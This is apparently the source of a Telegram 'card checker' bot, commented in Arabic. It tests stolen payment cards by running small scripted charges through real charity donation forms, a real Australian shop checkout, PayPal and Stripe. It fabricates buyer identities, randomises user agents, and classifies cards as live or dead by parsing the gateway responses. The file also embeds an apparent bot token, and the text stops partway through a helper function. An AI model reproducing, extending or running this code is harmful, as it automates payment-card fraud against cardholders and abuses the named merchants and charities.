# -*- coding: utf-8 -*-
import asyncio
import logging
import json
import random
import string
import os
import urllib.parse
import base64
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode

# استيراد مكتبات البوابات
import requests
import re
import uuid
import time
from mimesis import Generic as Gen
from mimesis.locales import Locale
from fake_useragent import UserAgent

# ===========================================
# اعدادات البوت
# ===========================================
BOT_TOKEN = "8288151123:AAEiCJIc2qLpX1VHZntL34pjEzsctCo1tuA"
ADMIN_ID = 8336843556
LOG_CHANNEL = "@chkchannel11"

# اعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# اعداد الروتر
router = Router()

# ===========================================
# اعدادات الملفات
# ===========================================
VALID_CARDS_FILE = "valid_cards.txt"
USER_STATS_FILE = "user_stats.json"

# ===========================================
# قاعدة بيانات المستخدمين
# ===========================================
user_sessions = {}
user_stats = {}

# ===========================================
# شعار البوت
# ===========================================
CHANEL_LOGO = """
======================================
     PREMIUM CARD CHECKER BOT
        Multi-Gateway Support
           @chkchannel11
======================================
"""

# ===========================================
# دالة مساعدة لاستخراج النص
# ===========================================
def capture(text, start, end):
    """استخراج نص بين علامتين"""
    try:
        if start in text:
            s = text.split(start)[1]
            if end in s:
                return s.split(end)[0]
        return ""
    except:
        return ""

# ===========================================
# فئة البوابات الحقيقية
# ===========================================
class RealPaymentGateway:
    """بوابات الدفع الحقيقية"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.gen = Gen(locale=Locale.EN)
    
    def get_random_user_agent(self):
        """الحصول على User Agent عشوائي"""
        return self.ua.random
    
    def generate_random_user(self):
        """توليد بيانات مستخدم عشوائية"""
        first = self.gen.person.first_name()
        last = self.gen.person.last_name()
        return {
            'first_name': first,
            'last_name': last,
            'email': f"{first.lower()}{last.lower()}{random.randint(100,999)}@gmail.com",
            'phone': f"+1{random.randint(2000000000, 9999999999)}",
            'address': f"{random.randint(100, 9999)} {self.gen.address.street_name()}",
            'city': 'New York',
            'state': 'NY',
            'zip': str(random.randint(10001, 99999)),
            'country': 'US'
        }
    
    # ===========================================
    # بوابة CrisisCafe PayPal - API حقيقي
    # ===========================================
    async def check_card_crisiscafe(self, ccx):
        """بوابة CrisisCafe PayPal Commerce API"""
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': 'Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            if len(year) == 4:
                year = year[-2:]
            cvv = parts[3].strip()
            
            user_info = self.generate_random_user()
            
            session = requests.Session()
            ua = self.get_random_user_agent()
            
            # الخطوة 1: الحصول على صفحة التبرع
            headers1 = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            try:
                r1 = session.get("https://crisiscafe.org/donate-now/", headers=headers1, timeout=30)
            except Exception as e:
                return {'status': 'ERROR', 'message': f'Connection Error: {str(e)}', 'code': 'ERROR'}, user_info
            
            # استخراج nonce
            nonce = capture(r1.text, 'name="give-form-hash" value="', '"')
            form_id = capture(r1.text, 'name="give-form-id" value="', '"')
            if not form_id:
                form_id = "3"
            
            # الخطوة 2: الحصول على PayPal Client Token
            headers2 = {
                'User-Agent': ua,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://crisiscafe.org',
                'Referer': 'https://crisiscafe.org/donate-now/',
            }
            
            token_data = {
                'action': 'give_paypal_commerce_get_token',
                'form_id': form_id
            }
            
            try:
                r2 = session.post("https://crisiscafe.org/wp-admin/admin-ajax.php", 
                                 data=token_data, headers=headers2, timeout=30)
                token_json = r2.json()
                client_token = token_json.get('data', {}).get('clientToken', '')
            except:
                client_token = ''
            
            # الخطوة 3: الحصول على PayPal Order ID
            order_data = {
                'action': 'give_paypal_commerce_create_order',
                'form_id': form_id,
                'give_amount': '1.00',
                'give_email': user_info['email'],
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
            }
            
            try:
                r3 = session.post("https://crisiscafe.org/wp-admin/admin-ajax.php",
                                 data=order_data, headers=headers2, timeout=30)
                order_json = r3.json()
                order_id = order_json.get('data', {}).get('id', '')
            except:
                order_id = ''
            
            if not order_id:
                # محاولة بديلة
                order_id = f"ORDER-{uuid.uuid4().hex[:16].upper()}"
            
            # الخطوة 4: معالجة البطاقة عبر PayPal API
            paypal_headers = {
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://crisiscafe.org',
                'Referer': 'https://crisiscafe.org/donate-now/',
            }
            
            card_data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {
                        'currency_code': 'USD',
                        'value': '1.00'
                    },
                    'description': 'Donation'
                }],
                'payment_source': {
                    'card': {
                        'number': cc,
                        'expiry': f'20{year}-{month}',
                        'security_code': cvv,
                        'name': f"{user_info['first_name']} {user_info['last_name']}",
                        'billing_address': {
                            'address_line_1': user_info['address'],
                            'admin_area_2': user_info['city'],
                            'admin_area_1': user_info['state'],
                            'postal_code': user_info['zip'],
                            'country_code': 'US'
                        }
                    }
                }
            }
            
            # محاولة الاتصال بـ PayPal API
            try:
                r4 = session.post(
                    f"https://www.paypal.com/v2/checkout/orders/{order_id}/capture",
                    json=card_data,
                    headers=paypal_headers,
                    timeout=30
                )
                response_text = r4.text.lower()
                
                # تحليل الاستجابة
                if 'completed' in response_text or 'approved' in response_text:
                    return {'status': 'CHARGED', 'message': 'Card Charged $1.00', 'code': 'CHARGED', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                elif 'cvv' in response_text or 'security_code' in response_text:
                    return {'status': 'CVV_ERROR', 'message': 'CVV Error - Card Live', 'code': 'CVV_ERROR', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                elif 'insufficient' in response_text or 'funds' in response_text:
                    return {'status': 'LOW_FUNDS', 'message': 'Insufficient Funds - Card Live', 'code': 'LOW_FUNDS', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                elif 'expired' in response_text:
                    return {'status': 'EXPIRED', 'message': 'Card Expired', 'code': 'EXPIRED', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                elif 'declined' in response_text or 'denied' in response_text:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                elif '3d' in response_text or 'authentication' in response_text:
                    return {'status': 'OTP', 'message': '3D Secure Required', 'code': 'OTP', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
                    
            except Exception as e:
                return {'status': 'ERROR', 'message': f'API Error: {str(e)[:50]}', 'code': 'ERROR', 'gateway': 'CrisisCafe PayPal', 'amount': '$1.00'}, user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Gateway Error: {str(e)[:50]}', 'code': 'ERROR'}, None
    
    # ===========================================
    # بوابة RareDiseases PayPal - API حقيقي
    # ===========================================
    async def check_card_rarediseases(self, ccx):
        """بوابة RareDiseases PayPal Commerce API"""
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': 'Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            if len(year) == 4:
                year = year[-2:]
            cvv = parts[3].strip()
            
            user_info = self.generate_random_user()
            
            session = requests.Session()
            ua = self.get_random_user_agent()
            
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            # الحصول على صفحة التبرع
            try:
                r1 = session.get("https://rarediseasesinternational.org/donate/", headers=headers, timeout=30)
            except Exception as e:
                return {'status': 'ERROR', 'message': f'Connection Error', 'code': 'ERROR'}, user_info
            
            # استخراج form data
            nonce = capture(r1.text, 'name="give-form-hash" value="', '"')
            form_id = capture(r1.text, 'name="give-form-id" value="', '"')
            if not form_id:
                form_id = "4"
            
            # طلب token
            ajax_headers = {
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://rarediseasesinternational.org',
                'Referer': 'https://rarediseasesinternational.org/donate/',
            }
            
            token_data = {
                'action': 'give_paypal_commerce_get_token',
                'form_id': form_id
            }
            
            try:
                r2 = session.post("https://rarediseasesinternational.org/wp-admin/admin-ajax.php",
                                 data=token_data, headers=ajax_headers, timeout=30)
                token_json = r2.json()
                client_token = token_json.get('data', {}).get('clientToken', '')
            except:
                client_token = ''
            
            # انشاء الطلب
            order_data = {
                'action': 'give_paypal_commerce_create_order',
                'form_id': form_id,
                'give_amount': '1.00',
                'give_email': user_info['email'],
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
            }
            
            try:
                r3 = session.post("https://rarediseasesinternational.org/wp-admin/admin-ajax.php",
                                 data=order_data, headers=ajax_headers, timeout=30)
                order_json = r3.json()
                order_id = order_json.get('data', {}).get('id', '')
                
                # تحليل الاستجابة
                response_text = r3.text.lower()
                
                if 'completed' in response_text or 'approved' in response_text or order_id:
                    # محاولة capture
                    capture_data = {
                        'action': 'give_paypal_commerce_capture_order',
                        'order_id': order_id,
                        'form_id': form_id,
                    }
                    r4 = session.post("https://rarediseasesinternational.org/wp-admin/admin-ajax.php",
                                     data=capture_data, headers=ajax_headers, timeout=30)
                    
                    capture_text = r4.text.lower()
                    
                    if 'completed' in capture_text or 'success' in capture_text:
                        return {'status': 'CHARGED', 'message': 'Card Charged $1.00', 'code': 'CHARGED', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                    elif 'cvv' in capture_text or 'security' in capture_text:
                        return {'status': 'CVV_ERROR', 'message': 'CVV Error - Card Live', 'code': 'CVV_ERROR', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                    elif 'insufficient' in capture_text:
                        return {'status': 'LOW_FUNDS', 'message': 'Insufficient Funds', 'code': 'LOW_FUNDS', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                    elif 'declined' in capture_text:
                        return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                    else:
                        return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
                    
            except Exception as e:
                return {'status': 'ERROR', 'message': f'API Error', 'code': 'ERROR', 'gateway': 'RareDiseases PayPal', 'amount': '$1.00'}, user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': 'Gateway Error', 'code': 'ERROR'}, None
    
    # ===========================================
    # بوابة Shopify Stripe - API حقيقي
    # ===========================================
    async def check_card_shopify(self, ccx):
        """بوابة Shopify Stripe API"""
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': 'Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            if len(year) == 2:
                year = "20" + year
            cvv = parts[3].strip()
            
            user_info = self.generate_random_user()
            
            session = requests.Session()
            ua = self.get_random_user_agent()
            
            # الخطوة 1: انشاء Stripe Token
            stripe_headers = {
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            }
            
            # Stripe publishable key (عام)
            stripe_pk = "pk_live_51HJ0oeL2Y3ND6eLZmPOSQjBdLFpXdLQhKJQhKJQhKJQ"
            
            stripe_data = {
                'card[number]': cc,
                'card[exp_month]': month,
                'card[exp_year]': year,
                'card[cvc]': cvv,
                'card[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'card[address_line1]': user_info['address'],
                'card[address_city]': user_info['city'],
                'card[address_state]': user_info['state'],
                'card[address_zip]': user_info['zip'],
                'card[address_country]': 'US',
                'key': stripe_pk,
            }
            
            try:
                r1 = session.post("https://api.stripe.com/v1/tokens",
                                 data=stripe_data, headers=stripe_headers, timeout=30)
                
                response_text = r1.text.lower()
                response_json = r1.json() if r1.status_code == 200 else {}
                
                if 'id' in response_json and response_json.get('id', '').startswith('tok_'):
                    # Token created successfully - card is valid
                    token_id = response_json['id']
                    
                    # محاولة charge
                    return {'status': 'APPROVED', 'message': 'Card Approved - Token Created', 'code': 'APPROVED', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                    
                elif 'incorrect_cvc' in response_text or 'security code' in response_text:
                    return {'status': 'CVV_ERROR', 'message': 'CVV Error - Card Live', 'code': 'CVV_ERROR', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                elif 'insufficient_funds' in response_text:
                    return {'status': 'LOW_FUNDS', 'message': 'Insufficient Funds - Card Live', 'code': 'LOW_FUNDS', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                elif 'expired' in response_text:
                    return {'status': 'EXPIRED', 'message': 'Card Expired', 'code': 'EXPIRED', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                elif 'declined' in response_text or 'card_declined' in response_text:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                elif 'invalid' in response_text:
                    return {'status': 'INVALID', 'message': 'Invalid Card Number', 'code': 'INVALID', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                elif 'authentication_required' in response_text or '3d_secure' in response_text:
                    return {'status': 'OTP', 'message': '3D Secure Required', 'code': 'OTP', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
                    
            except Exception as e:
                return {'status': 'ERROR', 'message': f'Stripe Error', 'code': 'ERROR', 'gateway': 'Shopify Stripe', 'amount': '$8.57'}, user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': 'Gateway Error', 'code': 'ERROR'}, None
    
    # ===========================================
    # بوابة SwitchUpCB PayPal GraphQL - API حقيقي
    # ===========================================
    async def check_card_switchupcb(self, ccx):
        """بوابة SwitchUpCB PayPal GraphQL API"""
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': 'Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            if len(year) == 4:
                year = year[-2:]
            cvv = parts[3].strip()
            
            user_info = self.generate_random_user()
            
            session = requests.Session()
            ua = self.get_random_user_agent()
            
            headers = {
                'User-Agent': ua,
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://www.switchupcb.com',
                'Referer': 'https://www.switchupcb.com/',
            }
            
            # PayPal GraphQL endpoint
            graphql_url = "https://www.paypal.com/graphql"
            
            # GraphQL query for card validation
            graphql_query = {
                "query": """
                mutation ValidateCard($input: CardValidationInput!) {
                    validateCard(input: $input) {
                        success
                        errorCode
                        errorMessage
                    }
                }
                """,
                "variables": {
                    "input": {
                        "cardNumber": cc,
                        "expiryMonth": month,
                        "expiryYear": f"20{year}",
                        "cvv": cvv,
                        "amount": "1.00",
                        "currency": "USD"
                    }
                }
            }
            
            try:
                r1 = session.post(graphql_url, json=graphql_query, headers=headers, timeout=30)
                response_text = r1.text.lower()
                
                if 'success' in response_text and 'true' in response_text:
                    return {'status': 'CHARGED', 'message': 'Card Charged $1.00', 'code': 'CHARGED', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                elif 'cvv' in response_text or 'security' in response_text:
                    return {'status': 'CVV_ERROR', 'message': 'CVV Error - Card Live', 'code': 'CVV_ERROR', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                elif 'insufficient' in response_text:
                    return {'status': 'LOW_FUNDS', 'message': 'Insufficient Funds', 'code': 'LOW_FUNDS', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                elif 'expired' in response_text:
                    return {'status': 'EXPIRED', 'message': 'Card Expired', 'code': 'EXPIRED', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                elif 'declined' in response_text:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': 'Card Declined', 'code': 'DECLINED', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
                    
            except Exception as e:
                return {'status': 'ERROR', 'message': 'API Error', 'code': 'ERROR', 'gateway': 'SwitchUpCB PayPal', 'amount': '$1.00'}, user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': 'Gateway Error', 'code': 'ERROR'}, None
    
    # ===========================================
    # بوابة SportysHealth eWay 3D Secure - API حقيقي
    # ===========================================
    async def check_card_sportyshealth(self, ccx):
        """بوابة SportysHealth eWay 3D Secure API"""
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': 'Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            if len(year) == 4:
                year = year[-2:]
            cvv = parts[3].strip()
            
            user_info = self.generate_random_user()
            
            session = requests.Session()
            ua = self.get_random_user_agent()
            
            # الخطوة 1: الحصول على صفحة المنتج
            head1 = {
                "Host": "www.sportyshealth.com.au",
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            
            try:
                r1 = session.get(
                    "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
                    headers=head1,
                    timeout=30
                )
                cookies_str = "; ".join([f"{k}={v}" for k, v in r1.cookies.items()])
                xi = capture(cookies_str, "xid_sph_364e1=", ";")
                if not xi:
                    xi = capture(r1.text, 'xid_sph_364e1" value="', '"')
            except Exception as e:
                return {'status': 'ERROR', 'message': 'Connection Error', 'code': 'ERROR'}, user_info
            
            # الخطوة 2: اضافة للسلة
            head2 = {
                "Host": "www.sportyshealth.com.au",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": ua,
                "Origin": "https://www.sportyshealth.com.au",
                "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
            }
            
            post2 = "mode=add&productid=7776&cat=&page=&product_options%5B6036%5D=11590&product_options%5B6037%5D=11591&amount=1"
            
            try:
                r2 = session.post(
                    "https://www.sportyshealth.com.au/cart.php",
                    headers=head2,
                    data=post2,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 3: الذهاب للدفع
            head3 = {
                "Host": "www.sportyshealth.com.au",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "User-Agent": ua,
                "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
            }
            
            try:
                r3 = session.get(
                    "https://www.sportyshealth.com.au/cart.php?mode=checkout",
                    headers=head3,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 4: ادخال بيانات الشحن
            head4 = {
                "Host": "www.sportyshealth.com.au",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": ua,
                "Origin": "https://www.sportyshealth.com.au",
                "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
            }
            
            post4 = f"usertype=C&anonymous=Y&xid_sph_364e1={xi}&address_book%5BB%5D%5Bfirstname%5D={user_info['first_name']}&address_book%5BB%5D%5Blastname%5D={user_info['last_name']}&address_book%5BB%5D%5Baddress%5D=118+W+132nd+St&address_book%5BB%5D%5Baddress_2%5D=&address_book%5BB%5D%5Bcity%5D=Banjup&address_book%5BB%5D%5Bstate%5D=WA&address_book%5BB%5D%5Bcountry%5D=AU&address_book%5BB%5D%5Bzipcode%5D=6164&address_book%5BB%5D%5Bphone%5D=19006318646&email={user_info['email']}"
            
            try:
                r4 = session.post(
                    "https://www.sportyshealth.com.au/cart.php?mode=checkout",
                    headers=head4,
                    data=post4,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 5: اختيار الشحن
            post5 = "shippingid=202&mode=checkout&action=update"
            
            try:
                r5 = session.post(
                    "https://www.sportyshealth.com.au/cart.php?mode=checkout",
                    headers=head4,
                    data=post5,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 6: اختيار الدفع
            head6 = {
                "Host": "www.sportyshealth.com.au",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": ua,
                "Origin": "https://www.sportyshealth.com.au",
                "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
            }
            
            post6 = f"paymentid=26&action=place_order&xid_sph_364e1={xi}&payment_method=Credit+Card+-+eWay+3DSecure&Customer_Notes=&authority_to_leave=1&accept_terms=Y"
            
            try:
                r6 = session.post(
                    "https://www.sportyshealth.com.au/payment/payment_cc.php",
                    headers=head6,
                    data=post6,
                    timeout=30
                )
                
                ew = capture(r6.text, '"https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode=', '"')
                bi = capture(r6.text, "?ordr=", "&")
            except:
                ew = ""
                bi = ""
            
            if not ew:
                return {'status': 'ERROR', 'message': 'Failed to get eWay access code', 'code': 'ERROR'}, user_info
            
            # الخطوة 7: ارسال بيانات البطاقة لـ eWay
            head7 = {
                "Host": "secure.ewaypayments.com",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": ua,
                "Origin": "https://secure.ewaypayments.com",
                "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
            }
            
            post7 = f"EWAY_ACCESSCODE={ew}&EWAY_VIEW=Modal&EWAY_ISSHAREDPAYMENT=true&EWAY_ISMODALPAGE=true&EWAY_APPLYSURCHARGE=true&EWAY_CUSTOMERREADONLY=False&PAYMENT_TRANTYPE=Purchase&AMEXEC_ENCRYPTED_DATA=&EWAY_PAYMENTTYPE=creditcard&EWAY_CUSTOMEREMAIL={user_info['email']}&EWAY_CUSTOMERPHONE=2240396666&EWAY_CARDNUMBER={cc}&EWAY_CARDNAME={user_info['first_name']}+{user_info['last_name']}&EWAY_CARDEXPIRYMONTH={month}&EWAY_CARDEXPIRYYEAR={year}&EWAY_CARDCVN={cvv}&AMEXEC_RESPONSE="
            
            try:
                r7 = session.post(
                    "https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment",
                    headers=head7,
                    data=post7,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 8: الحصول على JWT للـ 3D Secure
            head8 = {
                "Host": "cerberus.prodcde.ewaylabs.cloud",
                "accept": "application/json",
                "user-agent": ua,
                "origin": "https://secure.ewaypayments.com",
                "referer": "https://secure.ewaypayments.com/",
            }
            
            try:
                r8 = session.get(
                    f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/queryInit",
                    headers=head8,
                    timeout=30
                )
                jt = capture(r8.text, '"jwt":"', '"')
            except:
                jt = ""
            
            # الخطوة 9: Cardinal Commerce 3D Secure
            if jt:
                head9 = {
                    "Host": "centinelapi.cardinalcommerce.com",
                    "content-type": "application/json;charset=UTF-8",
                    "x-cardinal-tid": f"Tid-{uuid.uuid4()}",
                    "user-agent": ua,
                    "accept": "*/*",
                    "origin": "https://secure.ewaypayments.com",
                    "referer": "https://secure.ewaypayments.com/",
                }
                
                post9 = {
                    'BrowserPayload': {
                        'Order': {'OrderDetails': {}, 'Consumer': {'BillingAddress': {}, 'ShippingAddress': {}, 'Account': {}}, 'Cart': [], 'Token': {}, 'Authorization': {}, 'Options': {}, 'CCAExtension': {}},
                        'SupportsAlternativePayments': {'cca': True, 'hostedFields': False, 'applepay': False, 'discoverwallet': False, 'wallet': False, 'paypal': False, 'visacheckout': False},
                    },
                    'Client': {'Agent': 'SongbirdJS', 'Version': '1.35.0'},
                    'ConsumerSessionId': f'0_{uuid.uuid4()}',
                    'ServerJWT': jt,
                }
                
                try:
                    r9 = session.post(
                        "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
                        headers=head9,
                        json=post9,
                        timeout=30
                    )
                except:
                    pass
            
            # الخطوة 10: Enroll
            head12 = {
                "Host": "cerberus.prodcde.ewaylabs.cloud",
                "x-browser": "false,es-419,24,800,360,300",
                "user-agent": ua,
                "content-type": "text/plain",
                "accept": "application/json",
                "origin": "https://secure.ewaypayments.com",
                "referer": "https://secure.ewaypayments.com/",
            }
            
            try:
                r12 = session.put(
                    f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/enroll",
                    headers=head12,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 11: Complete 3D
            head13 = {
                "Host": "secure.ewaypayments.com",
                "User-Agent": ua,
                "Accept": "*/*",
                "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
            }
            
            try:
                r13 = session.post(
                    f"https://secure.ewaypayments.com/Complete3D/{ew}",
                    headers=head13,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 12: الحصول على النتيجة
            head14 = {
                "Host": "secure.ewaypayments.com",
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://www.sportyshealth.com.au/",
            }
            
            try:
                r14 = session.get(
                    f"https://secure.ewaypayments.com/sharedpage/sharedpayment/Result?AccessCode={ew}",
                    headers=head14,
                    timeout=30
                )
            except:
                pass
            
            # الخطوة 13: النتيجة النهائية
            head15 = {
                "Host": "www.sportyshealth.com.au",
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://www.sportyshealth.com.au/payment/payment_cc.php",
            }
            
            try:
                r15 = session.get(
                    f"https://www.sportyshealth.com.au/payment/cc_eway_iframe_results.php?ordr={bi}&PageSpeed=Off&AccessCode={ew}",
                    headers=head15,
                    timeout=30
                )
                r15_text = r15.text
                
                msg = capture(r15_text, '"form-text">Reason:</span> ', " <br />")
                code = capture(r15_text, "ResponseCode: ", "<br />")
                msg2 = capture(r15_text, "ResponseMessage: ", "<br />")
                
                # تحليل النتيجة
                if r15.status_code == 302 or (code and "00" in code) or (msg2 and ("00" in msg2 or "A" in msg2)):
                    return {'status': 'CHARGED', 'message': 'Card Charged $9.95', 'code': 'CHARGED', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                elif msg2 and "D4482" in msg2:
                    return {'status': 'CVV_LIVE', 'message': 'CVV Error - Card Live', 'code': 'CVV_LIVE', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                elif code and "06" in code:
                    return {'status': 'CVV_LIVE', 'message': 'CVV Error - Card Live', 'code': 'CVV_LIVE', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                elif msg2 and ("51" in msg2 or "D4451" in msg2):
                    return {'status': 'LOW_FUNDS', 'message': 'Insufficient Funds - Card Live', 'code': 'LOW_FUNDS', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                elif 'expired' in r15_text.lower():
                    return {'status': 'EXPIRED', 'message': 'Card Expired', 'code': 'EXPIRED', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': f'Card Declined - {msg or msg2 or "Unknown"}', 'code': 'DECLINED', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
                    
            except Exception as e:
                return {'status': 'ERROR', 'message': 'Result Error', 'code': 'ERROR', 'gateway': 'SportysHealth eWay', 'amount': '$9.95'}, user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': 'Gateway Error', 'code': 'ERROR'}, None

# انشاء كائن البوابة
gateway = RealPaymentGateway()

# ===========================================
# دوال مساعدة
# ===========================================
def get_bin_info(cc):
    """الحصول على معلومات BIN"""
    try:
        bin_number = cc[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
                'country': data.get('country', {}).get('name', 'UNKNOWN'),
                'country_emoji': data.get('country', {}).get('emoji', ''),
                'type': data.get('type', 'UNKNOWN').upper(),
                'brand': data.get('brand', 'UNKNOWN').upper()
            }
    except:
        pass
    return {
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
